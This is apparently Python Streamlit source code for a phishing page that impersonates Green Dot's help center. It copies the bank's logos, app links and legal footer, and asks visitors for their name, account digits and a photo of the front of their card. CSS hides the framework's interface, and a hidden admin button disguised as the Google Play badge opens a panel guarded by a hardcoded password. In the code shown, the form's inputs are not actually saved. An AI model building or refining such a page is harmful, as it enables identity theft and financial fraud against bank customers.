
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DB CONFIG ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- UI SHIELD ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    /* Hide all Streamlit header elements, anchors and link icons */
    [data-testid='stHeader'], header, footer, .stDeployButton, 
    .section-anchor, a.section-anchor, 
    [data-testid='stHeaderActionElements'], .st-emotion-cache-gi0tri, .etxdrby3,
    [data-testid='stToolbar'], [data-testid='stElementToolbar'],
    .st-emotion-cache-140j12g, button[title='View fullscreen'] {
        display: none !important; 
        visibility: hidden !important; 
        height: 0 !important; 
        width: 0 !important;
        opacity: 0 !important;
        pointer-events: none !important;
    }

    /* Disable pointers globally for images/headers except in promo box */
    [data-testid="stImage"], h1, h2, h3 {
        pointer-events: none !important;
    }

    .stButton > button, div[data-testid='stForm'] .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        border-radius: 8px !important;
        border: none !important;
        font-weight: 600 !important;
        width: 100% !important;
        height: 45px !important;
        pointer-events: auto !important; 
    }

    /* DISGUISED LOGIN BUTTON OVER GOOGLE PLAY SVG */
    .disguised-btn-container {
        position: relative;
        display: inline-block;
        width: 130px;
        height: 40px;
    }
    
    .disguised-btn-container button {
        position: absolute !important;
        top: 0 !important; left: 0 !important;
        width: 130px !important; height: 40px !important;
        background: transparent !important;
        border: none !important;
        color: transparent !important;
        z-index: 10 !important;
        cursor: pointer !important;
        padding: 0 !important;
    }

    .promo-box {
        background-color: #111; padding: 30px; text-align: center;
        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
        pointer-events: auto !important; 
    }

    .promo-box a, .promo-box img {
        pointer-events: auto !important;
        cursor: pointer !important;
    }

    /* CLEAN LEGAL FOOTER */
    .legal-container {
        font-size: 11px !important; 
        color: #666 !important; 
        text-align: center !important;
        margin-top: 40px !important; 
        padding-top: 20px !important;
        border-top: 1px solid #222 !important; 
        line-height: 1.6 !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v32_7_8", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")

    # --- DOWNLOAD APP SECTION (RESTORED SIDE-BY-SIDE LAYOUT) ---
    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
    """, unsafe_allow_html=True)
    
    col_app_store = st.columns([1, 1, 1, 1, 1])
    with col_app_store[1]: # Play Store Column
        st.markdown("<div class='disguised-btn-container'>", unsafe_allow_html=True)
        if st.button(" ", key="admin_trigger"): 
            st.session_state.admin_mode = True
            st.rerun()
        st.markdown("""<a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
            </a></div>""", unsafe_allow_html=True)
    
    with col_app_store[3]: # App Store Column
        st.markdown("""<a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
            </a>""", unsafe_allow_html=True)

    st.markdown("""<p style='color:#888; font-size: 13px; margin-top:20px;'>Secure mobile banking for your account.</p></div>""", unsafe_allow_html=True)

    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)

else:
    st.title("Admin Access")
    pw = st.text_input("Auth Key", type="password")
    if st.button("CHECK"):
        if pw == "Diostieneelpoder1": st.write("Access Granted")
    if st.button("↩"):
        st.session_state.admin_mode = False
        st.rerun()
